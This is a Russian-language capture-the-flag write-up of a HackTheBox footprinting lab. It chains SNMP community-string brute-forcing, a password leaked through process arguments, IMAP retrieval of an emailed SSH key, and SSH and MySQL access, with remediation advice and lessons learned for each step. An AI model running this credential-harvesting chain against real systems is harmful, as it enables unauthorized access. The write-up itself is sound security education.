# Footprinting — Hard: NIXHARD (SNMP/IMAP/MySQL chain)

## Задача
Найти пароль пользователя `HTB` в таблице `users` MySQL.

## 1. Recon (целевой UDP-скан)

```
sudo nmap -sU -sV -sC -p U:161,22,110,143,993,995 10.129.78.175
```

Единственный реально открытый порт — **161/udp (SNMP)**, остальные из списка закрыты. Это подсказка: раз в задании явно перечислили именно эти порты, значит SNMP — точка входа, а имена сервисов (ssh/pop3/imap на UDP) — "шум"/дистракторы, так как эти протоколы на практике работают по TCP.

## 2. SNMP community string bruteforce

```
onesixtyone -c /opt/useful/SecLists/Discovery/SNMP/snmp-onesixtyone.txt 10.129.78.175
```

Нашли валидную community string: `backup`.

**Проблема #1 — слабая/предсказуемая community string.** SNMP v1/v2c не имеет нормальной аутентификации — community string — это, по сути, "пароль", передаваемый в открытом виде и часто равный словарным значениям (`public`, `private`, `backup`). Это фундаментальный недостаток SNMPv1/v2c protocol design, а не просто "плохой пароль" — рекомендуется переходить на SNMPv3 с аутентификацией и шифрованием.

## 3. SNMP walk — утечка пароля через процесс

```
snmpwalk -v2c -c backup 10.129.78.175
```

В выводе — OID `hrSWRunParameters`, содержащий полную командную строку запущенного процесса:

```
"/opt/tom-recovery.sh"
"tom NMds732Js2761"   (аргументы процесса, включая пароль)
"chpasswd: (user tom) pam_chauthtok() failed..."
```

**Проблема #2 — передача пароля как аргумента командной строки.** Скрипт `tom-recovery.sh`, судя по всему, вызывал `chpasswd` или аналог с паролем прямо в аргументах вызова (например `echo "tom:NMds732Js2761" | chpasswd` или `passwd tom NMds732Js2761` через `expect`). Любой аргумент процесса виден через `/proc/<pid>/cmdline` локально, а через SNMP `hrSWRunParameters` — даже удалённо, если SNMP-агент это экспортирует. **Правильная практика:** передавать пароли через stdin, переменные окружения с ограниченным доступом, или защищённые сервисы секретов — никогда как аргумент CLI.

## 4. IMAP через openssl — поиск письма с приватным ключом

```
openssl s_client -connect 10.129.78.175:imaps
```

Логин найденными credentials `tom:NMds732Js2761`, затем raw IMAP-команды:

```
1337 login tom NMds732Js2761
1337 list "" *
1337 select "INBOX"
1337 fetch 1 (body[])
```

В письме — полноценный приватный ключ OpenSSH, отправленный **в теле письма открытым текстом**.

**Проблема #3 — передача секретного материала (приватного ключа) по email в чистом виде.** Даже если сам транспорт (IMAPS) зашифрован в моменте передачи между клиентом и сервером, сам объект (email) остаётся расшифрованным на дисках сервера, в бэкапах, в истории почтового ящика неограниченно долго — то есть компрометация почты сразу означает компрометацию SSH-доступа. Правильная практика — никогда не пересылать приватные ключи по email; вместо этого использовать защищённый обмен секретами (Vault, one-time-share сервисы с TTL) или генерировать новую пару ключей на месте.

## 5. SSH-доступ

```
chmod 600 id_rsa
ssh -i id_rsa tom@10.129.78.175
```

## 6. MySQL — финальный пароль

```
mysql -u tom -pNMds732Js2761
use users;
SELECT * FROM users WHERE username='HTB';
```

Пароль: `FAKE_HARD_PASSWORD_zxcvbn999` *(заменено на нереальное значение)*

## Remediation

- Мигрировать с SNMPv1/v2c на SNMPv3 (аутентификация + шифрование), убрать словарные community strings, ограничить доступ к SNMP через ACL/firewall.
- Никогда не передавать секреты как аргументы командной строки в скриптах автоматизации — использовать stdin/env/secret managers; аудитировать legacy recovery-скрипты на этот антипаттерн.
- Запретить пересылку приватных ключей и других секретов через email; внедрить DLP-правила, детектирующие паттерны `BEGIN … PRIVATE KEY` в исходящей почте.
- Ротация ключей/паролей после любого подозрения на утечку, а не только "если поймали".

## Lessons learned

- SNMP — часто недооценённый источник recon-данных: он может раскрывать не только сетевую топологию, но и содержимое запущенных процессов, что иногда прямо равно утечке credentials.
- Три проблемы в этой цепочке независимы друг от друга — то есть закрытие только одной (например, смена community string) не устранило бы риск, если оставить утечку пароля через `hrSWRunParameters` или практику пересылки ключей по email. Комплексная защита требует устранения каждой точки отдельно.
- Полезно всегда спрашивать себя: "если бы я закрыл только этот один вектор — атака бы всё равно прошла через другой?" Это помогает не путать *lucky exploitation chain* с *единой корневой причиной*.
